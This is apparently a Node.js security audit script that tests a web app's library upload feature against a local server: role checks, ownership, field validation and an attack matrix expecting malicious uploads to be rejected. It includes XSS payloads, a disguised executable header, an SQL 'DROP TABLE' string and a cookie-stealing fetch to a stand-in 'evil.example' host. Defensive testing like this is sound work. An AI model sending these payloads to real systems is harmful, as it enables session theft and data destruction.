// Deep production QA audit of the Library/Resources feature -- real HTTP
// requests bypassing the UI entirely, real file-upload attack payloads,
// real DB inspection. No fixes applied; this is discovery + evidence only.
//
// Run: node tests/audit-library.js (dev server must be running)

const http = require("http");
const fs = require("fs");
const path = require("path");
const jwt = require("jsonwebtoken");
const cfg = require(path.join(__dirname, "..", "src", "config"));
const { pool } = require(path.join(__dirname, "..", "src", "db"));

const BASE = "http://localhost:3000";
const results = [];
function record(section, name, ok, detail) {
  results.push({ section, name, ok, detail });
  console.log(`  ${ok ? "✓" : "✗"} [${section}] ${name}${detail ? " -- " + detail : ""}`);
}
function tokenFor(id, role) { return jwt.sign({ id, role }, cfg.jwtSecret, { expiresIn: "1h" }); }
// Builds real binary content as a Buffer: fixed magic-byte prefix +
// arbitrary ASCII filler (safe to express as a string -- filler is always
// < 0x80) -- see multipartRequestMulti's own comment for why this matters.
function sig(bytes, filler) { return Buffer.concat([Buffer.from(bytes), Buffer.from(filler || "", "utf8")]); }

function jsonRequest(method, urlPath, token, body) {
  return new Promise((resolve, reject) => {
    const payload = body ? JSON.stringify(body) : null;
    const req = http.request(
      BASE + urlPath,
      { method, headers: { ...(token ? { Authorization: `Bearer ${token}` } : {}), ...(payload ? { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(payload) } : {}) } },
      (res) => {
        let raw = "";
        res.on("data", (c) => (raw += c));
        res.on("end", () => {
          let json = null;
          try { json = raw ? JSON.parse(raw) : null; } catch {}
          resolve({ status: res.statusCode, body: json, headers: res.headers });
        });
      }
    );
    req.on("error", reject);
    if (payload) req.write(payload);
    req.end();
  });
}

// Minimal real multipart/form-data builder -- full control over the
// claimed Content-Type and filename per field, independent of each other,
// exactly what a real attacker crafting a raw request has. `fileFields` is
// an array so a single request can carry both `file` and `coverImage` at
// once, exactly like the real Add Book form does.
//
// Built as a Buffer throughout, not a JS string -- req.write(someString)
// defaults to UTF-8 encoding, which silently corrupts any raw byte >= 0x80
// (e.g. JPEG's 0xFF 0xD8 0xFF, PNG's 0x89, a raw MP3 frame sync's 0xFF)
// before it ever reaches the server. An earlier version of this harness
// built the body as a string and falsely reported those three legitimate
// formats as "rejected" -- the fix under test was never actually wrong,
// the bytes it received over the wire were. `fileField.content` may be a
// Buffer (for real binary signatures) or a string (for text/HTML payloads,
// where UTF-8 is exactly what's wanted).
function multipartRequestMulti(method, urlPath, token, fields, fileFields) {
  return new Promise((resolve, reject) => {
    const boundary = "----zzlibaudit" + Date.now() + Math.random().toString(36).slice(2);
    const chunks = [];
    const push = (s) => chunks.push(Buffer.isBuffer(s) ? s : Buffer.from(s, "utf8"));
    for (const [k, v] of Object.entries(fields)) {
      push(`--${boundary}\r\nContent-Disposition: form-data; name="${k}"\r\n\r\n${v}\r\n`);
    }
    for (const ff of fileFields || []) {
      push(`--${boundary}\r\nContent-Disposition: form-data; name="${ff.name}"; filename="${ff.filename}"\r\nContent-Type: ${ff.contentType}\r\n\r\n`);
      push(ff.content);
      push("\r\n");
    }
    push(`--${boundary}--\r\n`);
    const body = Buffer.concat(chunks);
    const req = http.request(
      BASE + urlPath,
      { method, headers: { Authorization: `Bearer ${token}`, "Content-Type": `multipart/form-data; boundary=${boundary}`, "Content-Length": body.length } },
      (res) => {
        let raw = "";
        res.on("data", (c) => (raw += c));
        res.on("end", () => {
          let json = null;
          try { json = raw ? JSON.parse(raw) : null; } catch {}
          resolve({ status: res.statusCode, body: json, headers: res.headers });
        });
      }
    );
    req.on("error", reject);
    req.write(body);
    req.end();
  });
}
function multipartRequest(method, urlPath, token, fields, fileField) {
  return multipartRequestMulti(method, urlPath, token, fields, fileField ? [fileField] : []);
}

function rawFileRequest(urlPath, token) {
  return new Promise((resolve, reject) => {
    const req = http.request(
      BASE + urlPath,
      { method: "GET", headers: token ? { Authorization: `Bearer ${token}` } : {} },
      (res) => {
        let raw = "";
        res.on("data", (c) => (raw += c));
        res.on("end", () => resolve({ status: res.statusCode, headers: res.headers, body: raw }));
      }
    );
    req.on("error", reject);
    req.end();
  });
}

let fx = { groupId: null, groupId2: null, mtId: null, totId: null, totOutsideId: null, traineeId: null, adminId: null, adminNoPermId: null, bookIds: [] };

async function wipe() {
  const idSub = "SELECT id FROM user_credentials WHERE member_code LIKE 'ZZLIBAUD%'";
  const { rows: materialRows } = await pool.query(
    `SELECT filename, cover_image FROM learning_materials WHERE supervisor_id IN (${idSub}) OR admin_id IN (${idSub})`
  );
  for (const m of materialRows) {
    for (const f of [m.filename, m.cover_image]) {
      if (f) { try { fs.unlinkSync(path.join(cfg.uploadsDir, "materials", f)); } catch {} }
    }
  }
  await pool.query(`DELETE FROM learning_materials WHERE supervisor_id IN (${idSub}) OR admin_id IN (${idSub})`);
  await pool.query(`DELETE FROM admin_permissions WHERE admin_id IN (${idSub})`);
  await pool.query(`DELETE FROM students WHERE id IN (${idSub})`);
  await pool.query(`DELETE FROM supervisors WHERE supervisor_type='in_training' AND id IN (${idSub})`);
  await pool.query(`DELETE FROM supervisors WHERE supervisor_type='primary' AND id IN (${idSub})`);
  await pool.query(`DELETE FROM admin_users WHERE id IN (${idSub})`);
  await pool.query("DELETE FROM user_credentials WHERE member_code LIKE 'ZZLIBAUD%'");
  await pool.query("DELETE FROM trainer_groups WHERE name LIKE 'ZZLIBAUD%'");
}

async function setup() {
  await wipe();
  const grp = await pool.query("INSERT INTO trainer_groups (name) VALUES ('ZZLIBAUD Group')");
  fx.groupId = grp.insertId;
  const grp2 = await pool.query("INSERT INTO trainer_groups (name) VALUES ('ZZLIBAUD Group2')");
  fx.groupId2 = grp2.insertId;

  const mt = await pool.query("INSERT INTO user_credentials (member_code, password_hash, role, status) VALUES ('ZZLIBAUDMT', 'x', 'supervisor', 'active')");
  fx.mtId = mt.insertId;
  await pool.query("INSERT INTO supervisors (id, full_name, supervisor_type, group_id) VALUES (?, 'ZZLIBAUD MT', 'primary', ?)", [fx.mtId, fx.groupId]);

  const tot = await pool.query("INSERT INTO user_credentials (member_code, password_hash, role, status) VALUES ('ZZLIBAUDTOT', 'x', 'supervisor', 'active')");
  fx.totId = tot.insertId;
  await pool.query("INSERT INTO supervisors (id, full_name, supervisor_type, primary_supervisor_id, group_id) VALUES (?, 'ZZLIBAUD ToT', 'in_training', ?, ?)", [fx.totId, fx.mtId, fx.groupId]);

  const totOutside = await pool.query("INSERT INTO user_credentials (member_code, password_hash, role, status) VALUES ('ZZLIBAUDTOT2', 'x', 'supervisor', 'active')");
  fx.totOutsideId = totOutside.insertId;
  await pool.query("INSERT INTO supervisors (id, full_name, supervisor_type, group_id) VALUES (?, 'ZZLIBAUD ToT Outside', 'primary', ?)", [fx.totOutsideId, fx.groupId2]);

  const stu = await pool.query("INSERT INTO user_credentials (member_code, password_hash, role, status) VALUES ('ZZLIBAUDS1', 'x', 'trainee', 'active')");
  fx.traineeId = stu.insertId;
  await pool.query("INSERT INTO students (id, full_name, group_id) VALUES (?, 'ZZLIBAUD Trainee', ?)", [fx.traineeId, fx.groupId]);

  const { rows: adminRows } = await pool.query("SELECT id FROM user_credentials WHERE role='admin' AND status='active' LIMIT 1");
  fx.adminId = adminRows.length ? adminRows[0].id : null;

  // A second admin, deliberately granted ZERO library permissions, to test
  // "new admin starts with no access" (auth.js's own documented default-deny).
  const adm2 = await pool.query("INSERT INTO user_credentials (member_code, password_hash, role, status) VALUES ('ZZLIBAUDADM2', 'x', 'admin', 'active')");
  fx.adminNoPermId = adm2.insertId;
  await pool.query("INSERT INTO admin_users (id, full_name) VALUES (?, 'ZZLIBAUD Admin NoPerm')", [fx.adminNoPermId]);
}

async function main() {
  console.log("=".repeat(70));
  console.log("AUDIT: Library / Resources");
  console.log("=".repeat(70));
  await setup();

  const mtToken = tokenFor(fx.mtId, "supervisor");
  const totToken = tokenFor(fx.totId, "supervisor");
  const totOutsideToken = tokenFor(fx.totOutsideId, "supervisor");
  const traineeToken = tokenFor(fx.traineeId, "trainee");
  const adminToken = fx.adminId ? tokenFor(fx.adminId, "admin") : null;
  const adminNoPermToken = tokenFor(fx.adminNoPermId, "admin");

  // ============================================================
  console.log("\n--- ROLE COVERAGE (direct API, not UI) ---");
  // ============================================================
  {
    const r1 = await jsonRequest("GET", "/api/library/books", traineeToken);
    record("ROLE", "Trainee CAN view the Library list (200)", r1.status === 200, `status ${r1.status}`);

    const r2 = await multipartRequest("POST", "/api/library/books", traineeToken, { title: "x", author: "x", resourceType: "book" }, { name: "file", filename: "a.pdf", contentType: "application/pdf", content: "%PDF-1.4\n" });
    record("ROLE", "Trainee CANNOT add a book (expected 403)", r2.status === 403, `status ${r2.status}, body=${JSON.stringify(r2.body)}`);

    const r3 = await jsonRequest("GET", "/api/library/online-search?doi=10.1/x", traineeToken);
    record("ROLE", "Trainee CANNOT use DOI search (expected 403)", r3.status === 403, `status ${r3.status}`);

    const r4 = await jsonRequest("PUT", "/api/library/books/999999", totToken, { title: "x", author: "x", resourceType: "book" });
    record("ROLE", "ToT (non-admin) CANNOT edit ANY book, even nonexistent (expected 403, role check before existence check)", r4.status === 403, `status ${r4.status}`);

    const r5 = await jsonRequest("PUT", "/api/library/books/999999", mtToken, { title: "x", author: "x", resourceType: "book" });
    record("ROLE", "Master Trainer (non-admin) CANNOT edit either (expected 403)", r5.status === 403, `status ${r5.status}`);

    const r6 = await jsonRequest("GET", "/api/library/books", null);
    record("ROLE", "No token at all -- rejected (expected 401)", r6.status === 401, `status ${r6.status}`);

    const r7 = await multipartRequest("POST", "/api/library/books", adminNoPermToken, { title: "x", author: "x", resourceType: "book" }, { name: "file", filename: "a.pdf", contentType: "application/pdf", content: "%PDF-1.4\n" });
    record("ROLE", "Admin with ZERO granted permissions CANNOT add a book (expected 403, default-deny)", r7.status === 403, `status ${r7.status}, body=${JSON.stringify(r7.body)}`);
  }

  // ============================================================
  console.log("\n--- SECURITY FIX RE-TEST: active-content attack matrix (book file) ---");
  // ============================================================
  const goodPdfBytes = () => "%PDF-1.4\n%real pdf content " + Math.random() + "\n";
  const bookAttacks = [
    { label: "HTML content, .html filename, Content-Type: video/mp4 (the ORIGINAL confirmed exploit)", filename: "evil.html", contentType: "video/mp4", content: "<html><body><script>window.__xss=1</script></body></html>" },
    { label: "HTML content, .htm filename, Content-Type: video/quicktime", filename: "evil.htm", contentType: "video/quicktime", content: "<html><body><script>window.__xss=1</script></body></html>" },
    { label: "HTML content, .pdf filename, Content-Type: application/pdf", filename: "fake.pdf", contentType: "application/pdf", content: "<html><body><script>window.__xss=1</script></body></html>" },
    { label: "HTML content, .mp4 filename, Content-Type: video/mp4", filename: "fake.mp4", contentType: "video/mp4", content: "<html><body><script>window.__xss=1</script></body></html>" },
    { label: "HTML content, .docx filename, Content-Type: office MIME", filename: "fake.docx", contentType: "application/vnd.openxmlformats-officedocument.wordprocessingml.document", content: "<html><body><script>window.__xss=1</script></body></html>" },
    { label: "SVG with <script>, .jpg filename, Content-Type: image/jpeg", filename: "evil.jpg", contentType: "image/jpeg", content: "<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>" },
    { label: "SVG with onload= event handler, .png filename, Content-Type: image/png", filename: "evil.png", contentType: "image/png", content: "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'></svg>" },
    { label: "Raw JavaScript file, .mp3 filename, Content-Type: audio/mpeg", filename: "evil.js", contentType: "audio/mpeg", content: "fetch('https://evil.example/steal?c='+document.cookie)" },
    { label: "Windows PE executable (MZ header), .pdf filename", filename: "evil.pdf", contentType: "application/pdf", content: sig([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]) },
    { label: "Windows PE executable (MZ header), .mp4 filename", filename: "evil.mp4", contentType: "video/mp4", content: sig([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]) },
    { label: "Polyglot: GIF87a magic bytes followed by <script> (valid-looking image header, HTML body)", filename: "polyglot.gif", contentType: "image/gif", content: "GIF87a<script>alert(1)</script>" },
  ];
  for (const atk of bookAttacks) {
    const r = await multipartRequest(
      "POST", "/api/library/books", totToken,
      { title: `ZZLIBAUD Attack: ${atk.label}`, author: "x", resourceType: "book" },
      { name: "file", filename: atk.filename, contentType: atk.contentType, content: atk.content }
    );
    record("ATTACK", `[book file] ${atk.label} -- rejected (expected 400)`, r.status === 400, `status ${r.status}, body=${JSON.stringify(r.body)}`);
    if (r.status === 201) {
      // Should never happen post-fix -- if it does, prove the severity the
      // same way the original finding was proven, and clean up immediately.
      fx.bookIds.push(r.body.id);
      const served = await rawFileRequest(`/uploads/materials/${r.body.filename}`, totToken);
      record("ATTACK", `[book file] ${atk.label} -- ALSO served back as potentially-executable content`, false, `content-type=${served.headers["content-type"]}, disposition=${served.headers["content-disposition"]}`);
    }
  }
  {
    const { rows } = await pool.query("SELECT COUNT(*) AS c FROM learning_materials WHERE title LIKE 'ZZLIBAUD Attack:%'");
    record("ATTACK", "None of the attack-matrix uploads left ANY DB row (all 11 genuinely rejected before INSERT)", Number(rows[0].c) === 0, `${rows[0].c} rows`);
  }

  // ============================================================
  console.log("\n--- SECURITY FIX RE-TEST: active-content attack matrix (cover image) ---");
  // ============================================================
  const coverAttacks = [
    { label: "HTML content, .jpg filename, Content-Type: image/jpeg", filename: "evil.jpg", contentType: "image/jpeg", content: "<html><body><script>window.__xss=1</script></body></html>" },
    { label: "SVG with <script>, .png filename, Content-Type: image/png", filename: "evil.png", contentType: "image/png", content: "<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>" },
    { label: "Windows PE executable (MZ header), .jpg filename", filename: "evil.jpg", contentType: "image/jpeg", content: sig([0x4d, 0x5a, 0x90, 0x00]) },
  ];
  for (const atk of coverAttacks) {
    const r = await multipartRequestMulti(
      "POST", "/api/library/books", totToken,
      { title: `ZZLIBAUD Cover Attack: ${atk.label}`, author: "x", resourceType: "book" },
      [
        { name: "file", filename: "legit.pdf", contentType: "application/pdf", content: goodPdfBytes() },
        { name: "coverImage", filename: atk.filename, contentType: atk.contentType, content: atk.content },
      ]
    );
    record("ATTACK", `[cover image] ${atk.label} (with a LEGITIMATE book file alongside it) -- rejected (expected 400)`, r.status === 400, `status ${r.status}, body=${JSON.stringify(r.body)}`);
    if (r.status === 201) fx.bookIds.push(r.body.id);
  }

  // ============================================================
  console.log("\n--- LEGITIMATE FILES STILL WORK (every supported format, full round trip) ---");
  // ============================================================
  const legitFiles = [
    { label: "PDF", filename: "real.pdf", contentType: "application/pdf", content: goodPdfBytes() },
    { label: "DOCX (OOXML zip container)", filename: "real.docx", contentType: "application/vnd.openxmlformats-officedocument.wordprocessingml.document", content: sig([0x50, 0x4b, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00, 0x00, 0x00], "fake-but-correctly-signed-zip-" + Math.random()) },
    { label: "JPEG image", filename: "real.jpg", contentType: "image/jpeg", content: sig([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46], "fakejpegdata" + Math.random()) },
    { label: "PNG image", filename: "real.png", contentType: "image/png", content: sig([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a], "fakepngdata" + Math.random()) },
    { label: "MP4 video (ftyp box)", filename: "real.mp4", contentType: "video/mp4", content: sig([0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70, 0x69, 0x73, 0x6f, 0x6d], "fakemp4data" + Math.random()) },
    { label: "WAV audio (RIFF/WAVE)", filename: "real.wav", contentType: "audio/wav", content: sig([0x52, 0x49, 0x46, 0x46, 0x00, 0x00, 0x00, 0x00, 0x57, 0x41, 0x56, 0x45], "fakewavdata" + Math.random()) },
    { label: "MP3 audio (ID3v2 tag)", filename: "real.mp3", contentType: "audio/mpeg", content: sig([0x49, 0x44, 0x33, 0x03, 0x00, 0x00, 0x00], "fakemp3data" + Math.random()) },
    { label: "MP3 audio (raw frame sync, no ID3)", filename: "rawframe.mp3", contentType: "audio/mpeg", content: sig([0xff, 0xfb, 0x90, 0x00], "fakemp3data" + Math.random()) },
  ];
  for (const lf of legitFiles) {
    const r = await multipartRequest(
      "POST", "/api/library/books", totToken,
      { title: `ZZLIBAUD Legit: ${lf.label}`, author: "x", resourceType: "book" },
      { name: "file", filename: lf.filename, contentType: lf.contentType, content: lf.content }
    );
    record("LEGIT", `[${lf.label}] accepted (expected 201)`, r.status === 201, `status ${r.status}, body=${JSON.stringify(r.body).slice(0, 150)}`);
    if (r.status === 201) {
      fx.bookIds.push(r.body.id);
      const list = await jsonRequest("GET", "/api/library/books", totToken);
      const found = list.body.books.find((b) => b.id === r.body.id);
      record("LEGIT", `[${lf.label}] appears correctly in Library list`, !!found, "");
      const served = await rawFileRequest(`/uploads/materials/${r.body.filename}`, totToken);
      record("LEGIT", `[${lf.label}] downloads successfully (200)`, served.status === 200, `status ${served.status}`);
    }
  }

  // ============================================================
  console.log("\n--- SERVING SECURITY HEADERS (real HTTP response inspection) ---");
  // ============================================================
  {
    const r = await multipartRequest("POST", "/api/library/books", totToken, { title: "ZZLIBAUD Header Check", author: "x", resourceType: "book" }, { name: "file", filename: "x.pdf", contentType: "application/pdf", content: goodPdfBytes() });
    fx.bookIds.push(r.body.id);
    const served = await rawFileRequest(`/uploads/materials/${r.body.filename}`, totToken);
    record("HEADERS", "X-Content-Type-Options: nosniff is present on every served upload", served.headers["x-content-type-options"] === "nosniff", `got: ${served.headers["x-content-type-options"]}`);
    record("HEADERS", "A real PDF is served inline (not forced to download -- it's on the inline-safe allowlist)", (served.headers["content-disposition"] || "").startsWith("inline"), `got: ${served.headers["content-disposition"]}`);
    record("HEADERS", "Content-Type for a real PDF is application/pdf", (served.headers["content-type"] || "").includes("pdf"), `got: ${served.headers["content-type"]}`);

    // Directly test the SERVING layer's own defense-in-depth in isolation
    // from upload validation -- an .html file can no longer reach disk via
    // POST /books post-fix, but this proves the independent second layer
    // the audit specifically asked for: even a file that somehow exists
    // (a future bug, a different upload path, manual DB tampering) must
    // never be served inline just because it has a matching, authorized
    // DB row. Written directly to disk + DB, bypassing the upload route
    // entirely, to isolate this one claim.
    const fs2 = require("fs");
    const probeFilename = "zzlibaudit-probe-" + Date.now() + ".html";
    const probePath = path.join(cfg.uploadsDir, "materials", probeFilename);
    fs2.writeFileSync(probePath, "<html><body><script>alert(1)</script></body></html>");
    const probeRow = await pool.query(
      "INSERT INTO learning_materials (supervisor_id, title, author, material_type, filename, original_name, resource_type) VALUES (?,?,?,?,?,?,?)",
      [fx.totId, "ZZLIBAUD Probe", "x", "book", probeFilename, "probe.html", "book"]
    );
    try {
      const probed = await rawFileRequest(`/uploads/materials/${probeFilename}`, traineeToken);
      record("HEADERS", "A .html file with a real, authorized DB row is still served as attachment, NOT inline (serving-layer defense-in-depth, independent of upload validation)", probed.status === 200 && (probed.headers["content-disposition"] || "").startsWith("attachment"), `status ${probed.status}, disposition=${probed.headers["content-disposition"]}`);
      record("HEADERS", "...and still carries nosniff even in this edge case", probed.headers["x-content-type-options"] === "nosniff", `got: ${probed.headers["x-content-type-options"]}`);
    } finally {
      await pool.query("DELETE FROM learning_materials WHERE id = ?", [probeRow.insertId]);
      fs2.unlinkSync(probePath);
    }
  }

  console.log("\n--- SECURITY: SQLi / XSS in metadata text fields ---");
  // ============================================================
  {
    const payloads = {
      sqli: "'; DROP TABLE learning_materials; --",
      xssTitle: "<script>alert(document.cookie)</script>",
      xssAttr: "\"><img src=x onerror=alert(1)>",
      unicode: "عنوان كتاب تجريبي — Français — 日本語",
    };
    for (const [label, payload] of Object.entries(payloads)) {
      const r = await multipartRequest(
        "POST", "/api/library/books", totToken,
        { title: `ZZLIBAUD ${label}: ${payload}`, author: payload, resourceType: "book", category: payload, description: payload },
        { name: "file", filename: "x.pdf", contentType: "application/pdf", content: "%PDF-1.4\nreal pdf content\n" + Math.random() }
      );
      const stored = r.status === 201;
      record("INJECT", `[${label}] accepted without crashing/leaking SQL error (201 expected)`, stored, `status ${r.status}, body=${JSON.stringify(r.body).slice(0, 150)}`);
      if (stored) {
        fx.bookIds.push(r.body.id);
        const exactMatch = r.body.title === `ZZLIBAUD ${label}: ${payload}` && r.body.author === payload;
        record("INJECT", `[${label}] stored verbatim (parameterized, not mangled/escaped at write time)`, exactMatch, "");
        const list = await jsonRequest("GET", "/api/library/books", mtToken);
        const found = list.body.books.find((b) => b.id === r.body.id);
        record("INJECT", `[${label}] appears correctly in the list read-back, title intact`, found && found.title === r.body.title, "");
      }
    }
  }

  // ============================================================
  console.log("\n--- REQUIRED FIELD VALIDATION ---");
  // ============================================================
  {
    const cases = [
      { label: "no title", fields: { author: "x", resourceType: "book" }, file: true },
      { label: "no author", fields: { title: "x", resourceType: "book" }, file: true },
      { label: "no type", fields: { title: "x", author: "x" }, file: true },
      { label: "invalid type", fields: { title: "x", author: "x", resourceType: "not_a_real_type" }, file: true },
      { label: "no file", fields: { title: "x", author: "x", resourceType: "book" }, file: false },
    ];
    for (const c of cases) {
      const r = await multipartRequest("POST", "/api/library/books", totToken, c.fields, c.file ? { name: "file", filename: "x.pdf", contentType: "application/pdf", content: "%PDF-1.4\n" + Math.random() } : null);
      record("REQUIRED", `${c.label} -- rejected (expected 400)`, r.status === 400, `status ${r.status}, body=${JSON.stringify(r.body)}`);
    }
    const { rows: orphanCheck } = await pool.query("SELECT COUNT(*) AS c FROM learning_materials WHERE title = 'x' AND supervisor_id = ?", [fx.totId]);
    record("REQUIRED", "None of the rejected attempts left a partial DB row", Number(orphanCheck[0].c) === 0, `${orphanCheck[0].c} rows`);
    const materialsDir = path.join(cfg.uploadsDir, "materials");
    const beforeCount = fs.readdirSync(materialsDir).length;
    record("REQUIRED", "(informational) materials dir currently has N files", true, `${beforeCount} files -- orphan-cleanup checked explicitly below`);
  }

  // ============================================================
  console.log("\n--- PUBLICATION YEAR validation ---");
  // ============================================================
  {
    const cases = [
      { label: "valid current year", value: String(new Date().getFullYear()), expectOk: true },
      { label: "valid historical (1850)", value: "1850", expectOk: true },
      { label: "year 999 (just below min)", value: "999", expectOk: false },
      { label: "year 0", value: "0", expectOk: false },
      { label: "negative", value: "-5", expectOk: false },
      { label: "decimal", value: "2020.5", expectOk: false },
      { label: "letters", value: "abcd", expectOk: false },
      { label: "extremely large", value: "99999999", expectOk: false },
      { label: "empty string (optional field)", value: "", expectOk: true },
      { label: "far future (current+2)", value: String(new Date().getFullYear() + 2), expectOk: false },
    ];
    for (const c of cases) {
      const r = await multipartRequest(
        "POST", "/api/library/books", totToken,
        { title: `ZZLIBAUD Year ${c.label}`, author: "x", resourceType: "book", publicationYear: c.value },
        { name: "file", filename: "x.pdf", contentType: "application/pdf", content: "%PDF-1.4\n" + Math.random() }
      );
      const ok = c.expectOk ? r.status === 201 : r.status === 400;
      record("YEAR", `${c.label} (value="${c.value}") -- expected ${c.expectOk ? "accepted" : "rejected"}`, ok, `status ${r.status}`);
      if (r.status === 201) fx.bookIds.push(r.body.id);
    }
  }

  // ============================================================
  console.log("\n--- COUNTRY field -- backend must not trust the dropdown ---");
  // ============================================================
  {
    const r1 = await multipartRequest("POST", "/api/library/books", totToken, { title: "ZZLIBAUD Country valid", author: "x", resourceType: "book", country: "Lebanon" }, { name: "file", filename: "x.pdf", contentType: "application/pdf", content: "%PDF-1.4\n" + Math.random() });
    record("COUNTRY", "Valid country from the list -- accepted", r1.status === 201, `status ${r1.status}`);
    if (r1.status === 201) fx.bookIds.push(r1.body.id);

    const r2 = await multipartRequest("POST", "/api/library/books", totToken, { title: "ZZLIBAUD Country invalid", author: "x", resourceType: "book", country: "Not A Real Country <script>" }, { name: "file", filename: "x.pdf", contentType: "application/pdf", content: "%PDF-1.4\n" + Math.random() });
    record("COUNTRY", "Arbitrary string via direct API (bypassing the dropdown) -- rejected (expected 400)", r2.status === 400, `status ${r2.status}, body=${JSON.stringify(r2.body)}`);
  }

  // ============================================================
  console.log("\n--- DUPLICATE DETECTION (by file content hash) ---");
  // ============================================================
  {
    const content = "%PDF-1.4\nZZLIBAUD duplicate test content " + Date.now();
    const r1 = await multipartRequest("POST", "/api/library/books", totToken, { title: "ZZLIBAUD Dup A", author: "x", resourceType: "book" }, { name: "file", filename: "a.pdf", contentType: "application/pdf", content });
    record("DUP", "First upload of this exact content -- accepted", r1.status === 201, `status ${r1.status}`);
    if (r1.status === 201) fx.bookIds.push(r1.body.id);
    const r2 = await multipartRequest("POST", "/api/library/books", mtToken, { title: "ZZLIBAUD Dup B (different title, SAME file bytes)", author: "y", resourceType: "book" }, { name: "file", filename: "b.pdf", contentType: "application/pdf", content });
    record("DUP", "Second upload, same bytes, different title/filename/uploader -- rejected (expected 409)", r2.status === 409, `status ${r2.status}, body=${JSON.stringify(r2.body)}`);
  }

  // ============================================================
  console.log("\n--- IDOR / OWNERSHIP ---");
  // ============================================================
  {
    const r1 = await multipartRequest("POST", "/api/library/books", totToken, { title: "ZZLIBAUD IDOR Target", author: "x", resourceType: "book" }, { name: "file", filename: "x.pdf", contentType: "application/pdf", content: "%PDF-1.4\n" + Math.random() });
    const bookId = r1.body.id;
    fx.bookIds.push(bookId);

    const r2 = await jsonRequest("DELETE", `/api/library/books/${bookId}`, totOutsideToken);
    record("IDOR", "A DIFFERENT ToT (not the owner) cannot delete this book (expected 403)", r2.status === 403, `status ${r2.status}, body=${JSON.stringify(r2.body)}`);

    const r3 = await jsonRequest("DELETE", `/api/library/books/${bookId}`, mtToken);
    record("IDOR", "A DIFFERENT supervisor entirely (the Master Trainer, not the ToT who added it) also cannot delete it -- ownership is per-account, not per-Group", r3.status === 403, `status ${r3.status}`);

    // Confirm it's genuinely still there after both rejected attempts.
    const { rows } = await pool.query("SELECT id FROM learning_materials WHERE id = ?", [bookId]);
    record("IDOR", "Book still exists in DB after both rejected delete attempts", rows.length === 1, `${rows.length} rows`);

    const r4 = await jsonRequest("DELETE", `/api/library/books/${bookId}`, totToken);
    record("IDOR", "The ACTUAL owner CAN delete their own book", r4.status === 200, `status ${r4.status}`);
    fx.bookIds = fx.bookIds.filter((id) => id !== bookId);

    const r5 = await jsonRequest("DELETE", `/api/library/books/999999999`, totToken);
    record("IDOR", "Deleting a nonexistent book id -- 404, not a crash", r5.status === 404, `status ${r5.status}`);

    if (adminToken) {
      const r6 = await multipartRequest("POST", "/api/library/books", totToken, { title: "ZZLIBAUD Admin-delete Target", author: "x", resourceType: "book" }, { name: "file", filename: "x.pdf", contentType: "application/pdf", content: "%PDF-1.4\n" + Math.random() });
      const bookId2 = r6.body.id;
      const r7 = await jsonRequest("DELETE", `/api/library/books/${bookId2}`, adminToken);
      record("IDOR", "Admin (with library.delete permission, via seeded default grant) CAN delete ANY book, including one added by a ToT", r7.status === 200, `status ${r7.status}`);
    } else {
      record("IDOR", "Admin-deletes-any-book test -- SKIPPED (no admin account found)", true, "skipped");
    }
  }

  // ============================================================
  console.log("\n--- DOI SEARCH ---");
  // ============================================================
  {
    const r1 = await jsonRequest("GET", "/api/library/online-search?doi=", totToken);
    record("DOI", "Empty DOI -- rejected (expected 400)", r1.status === 400, `status ${r1.status}`);

    const r2 = await jsonRequest("GET", "/api/library/online-search?doi=not-a-real-doi-zzzzz-999", totToken);
    record("DOI", "Malformed/nonexistent DOI -- clean error, no crash (expected 404 or 502, never 500)", r2.status === 404 || r2.status === 502, `status ${r2.status}, body=${JSON.stringify(r2.body)}`);

    const r3 = await jsonRequest("GET", `/api/library/online-search?doi=${encodeURIComponent("'; DROP TABLE learning_materials; --")}`, totToken);
    record("DOI", "SQLi-shaped DOI string -- handled safely, no 500, no SQL error leak", r3.status !== 500, `status ${r3.status}`);

    const r4 = await jsonRequest("GET", `/api/library/online-search?doi=${encodeURIComponent("<script>alert(1)</script>")}`, totToken);
    record("DOI", "XSS-shaped DOI string -- handled safely, no 500", r4.status !== 500, `status ${r4.status}`);

    // A real, known-valid DOI (CC0, stable, used in Crossref's own docs/examples).
    const r5 = await jsonRequest("GET", "/api/library/online-search?doi=10.1037/0003-066X.59.1.29", totToken);
    record("DOI", "A real, valid DOI -- external Crossref lookup succeeds (requires internet access from this environment)", r5.status === 200 && r5.body && r5.body.title, `status ${r5.status}, title=${r5.body && r5.body.title}`);
    if (r5.status === 200) {
      record("DOI", "Response has no coverImageUrl/publicationLocation fabricated (both null, Crossref genuinely has neither)", r5.body.coverImageUrl === null && r5.body.publicationLocation === null, `coverImageUrl=${r5.body.coverImageUrl}, publicationLocation=${r5.body.publicationLocation}`);
    }

    // Rate limit: 20/min per account.
    let rateLimited = false;
    for (let i = 0; i < 22; i++) {
      const r = await jsonRequest("GET", `/api/library/online-search?doi=10.1000/test${i}`, totToken);
      if (r.status === 429) { rateLimited = true; break; }
    }
    record("DOI", "Rate limit (20/min/account) actually kicks in under rapid repeated calls", rateLimited, rateLimited ? "429 observed" : "never hit 429 in 22 calls");
  }

  // ============================================================
  console.log("\n--- PER-ROLE legitimate upload + reject-attack (every role that can add) ---");
  // ============================================================
  {
    const roleTokens = [
      { role: "Master Trainer", token: mtToken },
      { role: "ToT", token: totToken },
    ];
    if (adminToken) roleTokens.push({ role: "Admin", token: adminToken });
    for (const rt of roleTokens) {
      const legit = await multipartRequest("POST", "/api/library/books", rt.token, { title: `ZZLIBAUD RoleUpload ${rt.role}`, author: "x", resourceType: "book" }, { name: "file", filename: "x.pdf", contentType: "application/pdf", content: goodPdfBytes() });
      record("PERROLE", `${rt.role}: legitimate PDF upload succeeds`, legit.status === 201, `status ${legit.status}`);
      if (legit.status === 201) fx.bookIds.push(legit.body.id);

      const attack = await multipartRequest("POST", "/api/library/books", rt.token, { title: `ZZLIBAUD RoleAttack ${rt.role}`, author: "x", resourceType: "book" }, { name: "file", filename: "evil.html", contentType: "video/mp4", content: "<html><script>1</script></html>" });
